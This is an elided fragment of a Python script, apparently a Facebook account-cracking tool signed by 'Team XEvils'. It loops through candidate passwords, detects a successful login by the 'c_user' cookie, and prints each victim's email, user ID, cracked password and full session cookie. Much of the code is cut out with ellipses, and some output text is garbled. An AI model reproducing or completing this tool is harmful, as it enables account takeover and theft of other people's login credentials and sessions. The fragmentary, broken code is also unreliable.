...
AUTHOR    : MR Technical TigeR
FACEBOOK : Akash AbbaCi
VERSION    : 1.1
                                   [Team XEvils]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[âˆš]---------------------[Evil-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[EvilAbbasi] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
